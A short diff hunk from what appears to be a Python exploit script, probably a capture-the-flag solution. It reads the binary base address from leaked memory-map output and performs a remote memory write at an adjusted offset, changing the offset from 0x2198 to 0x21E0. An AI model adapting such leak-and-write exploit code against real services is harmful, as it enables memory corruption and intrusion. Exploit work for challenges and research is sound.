@@ -28,5 +28,5 @@ print("Received",output)
 binary_base = int(output.split(b"\n")[8].split(b'-')[0],16)
 
 print("Binary base",hex(binary_base))
-remote_write(r,binary_base + 0x2198, 126)
+remote_write(r,binary_base + 0x21E0, 126)
 print(r.recv())
